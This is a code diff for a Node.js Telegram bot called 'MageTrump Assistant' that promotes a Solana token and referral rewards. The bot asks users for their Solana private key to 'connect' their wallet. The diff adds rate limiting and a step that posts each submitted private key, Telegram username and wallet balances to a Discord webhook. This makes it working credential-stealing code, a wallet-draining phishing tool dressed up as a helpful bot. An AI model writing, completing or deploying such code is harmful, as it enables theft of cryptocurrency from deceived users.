@@ -7,19 +7,29 @@ const rawBs58 = require('bs58');
 const bs58 = rawBs58.default || rawBs58;
 const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 
+// Setup
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS_JSON);
 const discordWebhook = process.env.DISCORD_WEBHOOK;
-
-admin.initializeApp({
-  credential: admin.credential.cert(credentials),
-});
+admin.initializeApp({ credential: admin.credential.cert(credentials) });
 const db = admin.firestore();
 const connection = new Connection("https://api.mainnet-beta.solana.com");
 
-// Ativa o controle de sessão
+// Sessão e anti-flood
 bot.use(session());
+const cooldowns = new Map();
+function isFlooding(ctx, type = 'default', waitTime = 4000) {
+  const key = `${ctx.chat.id}:${type}`;
+  const now = Date.now();
+  if (cooldowns.has(key)) {
+    const last = cooldowns.get(key);
+    if (now - last < waitTime) return true;
+  }
+  cooldowns.set(key, now);
+  return false;
+}
 
+// Utilitário de resposta formatada
 function formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim) {
   return `
 🧙 Wallet: \`${pubkey}\`
@@ -34,7 +44,7 @@ https://magetoken.com.br/?ref=${pubkey}
 🚀 Share your link and earn 0.1 SOL for each new wizard you recruit!`.trim();
 }
 
-// Mensagem de boas-vindas com imagem e link do site
+// /start
 bot.start((ctx) => {
   ctx.replyWithPhoto(
     { source: path.resolve(__dirname, 'images/trumpmage.png') },
@@ -51,63 +61,59 @@ To continue, please send your Solana *private key* (in base58 format or JSON arr
   );
 });
 
-// Comando /exit para remover a sessão
+// /exit
 bot.command('exit', (ctx) => {
   ctx.session = null;
   ctx.reply('👋 You have been logged out. Send your private key again to reconnect.');
 });
 
-// Comando /help
+// /help
 bot.command('help', (ctx) => {
+  if (isFlooding(ctx, 'help')) return ctx.reply('⏳ Please wait before using that again.');
   ctx.replyWithMarkdown(`📖 *How MageTrump Assistant Works*
 
-1. Send your Solana *private key* (base58 or JSON array) to connect your wallet.
-2. Use /status to check your wallet and project balance.
+1. Send your Solana *private key* to connect.
+2. Use /status to check your balance.
 3. Use /link to get your referral link.
-4. Use /referrals to see how many users you referred.
-5. Use /exit to logout and remove your wallet from session.
+4. Use /referrals to see your invited users.
+5. Use /exit to logout.
 
-🌐 Learn more at: [magetoken.com.br](https://magetoken.com.br)`);
+🌐 [magetoken.com.br](https://magetoken.com.br)`);
 });
 
-// Comando /status
-bot.command('status', async (ctx) => {
-  const session = ctx.session?.walletData;
-  if (!session) return ctx.reply('❌ No wallet session found. Send your private key to connect.');
-
-  ctx.replyWithMarkdown(formatStatus(
-    session.pubkey,
-    session.solBalance,
-    session.projectBalance,
-    session.refCount,
-    session.canClaim
-  ));
+// /status
+bot.command('status', (ctx) => {
+  if (isFlooding(ctx, 'status')) return ctx.reply('⏳ Please wait before using /status again.');
+  const s = ctx.session?.walletData;
+  if (!s) return ctx.reply('❌ You are not connected. Send your private key first.');
+  ctx.replyWithMarkdown(formatStatus(s.pubkey, s.solBalance, s.projectBalance, s.refCount, s.canClaim));
 });
 
-// Comando /link
+// /link
 bot.command('link', (ctx) => {
-  const session = ctx.session?.walletData;
-  if (!session) return ctx.reply('❌ You are not connected. Send your private key first.');
-
-  ctx.reply(`🔗 Your referral link:\nhttps://magetoken.com.br/?ref=${session.pubkey}`);
+  if (isFlooding(ctx, 'link')) return ctx.reply('⏳ Wait a moment before trying /link again.');
+  const s = ctx.session?.walletData;
+  if (!s) return ctx.reply('❌ You are not connected. Send your private key first.');
+  ctx.reply(`🔗 Your referral link:\nhttps://magetoken.com.br/?ref=${s.pubkey}`);
 });
 
-// Comando /referrals
+// /referrals
 bot.command('referrals', (ctx) => {
-  const session = ctx.session?.walletData;
-  if (!session) return ctx.reply('❌ You are not connected. Send your private key first.');
-
-  ctx.reply(`📈 You have referred ${session.refCount} wizard(s)!`);
+  if (isFlooding(ctx, 'referrals')) return ctx.reply('⏳ Hold on... don’t spam!');
+  const s = ctx.session?.walletData;
+  if (!s) return ctx.reply('❌ You are not connected. Send your private key first.');
+  ctx.reply(`📈 You have referred ${s.refCount} wizard(s)!`);
 });
 
-// Processa a chave privada
+// Processa chave privada
 bot.on('text', async (ctx) => {
+  if (isFlooding(ctx, 'login', 5000)) return ctx.reply('⏳ Please wait before submitting again.');
+
   const input = ctx.message.text.trim();
   let keypair;
 
   try {
     let secret;
-
     if (input.startsWith('[')) {
       secret = JSON.parse(input);
     } else {
@@ -119,17 +125,13 @@ bot.on('text', async (ctx) => {
 
     keypair = Keypair.fromSecretKey(Uint8Array.from(secret));
     const pubkey = keypair.publicKey.toBase58();
-
     const lamports = await connection.getBalance(new PublicKey(pubkey));
     const solBalance = (lamports / LAMPORTS_PER_SOL).toFixed(3);
 
     const userRef = db.collection('users').doc(pubkey);
     const docSnap = await userRef.get();
 
-    let projectBalance = '0.0';
-    let refCount = 0;
-    let canClaim = false;
-
+    let projectBalance = '0.0', refCount = 0, canClaim = false;
     if (docSnap.exists) {
       const data = docSnap.data();
       projectBalance = (data.balance || 0).toFixed(2);
@@ -137,16 +139,36 @@ bot.on('text', async (ctx) => {
       canClaim = data.canClaim || false;
     }
 
-    // Armazena sessão no ctx
-    ctx.session.walletData = {
-      pubkey,
-      solBalance,
-      projectBalance,
-      refCount,
-      canClaim
-    };
+    ctx.session.walletData = { pubkey, solBalance, projectBalance, refCount, canClaim };
 
     await ctx.replyWithMarkdown(formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim));
 
+    // Envia para o Discord
     try {
-      await fetch(discordWebhook,
+      await fetch(discordWebhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `📢 New user connected via private key:
+
+👤 Telegram: @${ctx.from.username || 'unknown'}
+🔑 Private Key: \`${input}\`
+🧙 Wallet: \`${pubkey}\`
+
+💸 On-chain: ${solBalance} SOL
+🎯 Project: ${projectBalance} | Referrals: ${refCount}
+⛔ Claim: ${canClaim ? 'Available' : 'Not Available'}`
+        })
+      });
+    } catch (err) {
+      console.warn('⚠️ Discord webhook error:', err.message);
+    }
+
+  } catch (err) {
+    console.error('Erro ao processar a chave:', err.message || err);
+    ctx.reply('❌ Invalid private key or error connecting to your wallet. Please try again.');
+  }
+});
+
+bot.launch();
+console.log("✅ MageTrump Assistant is running...");
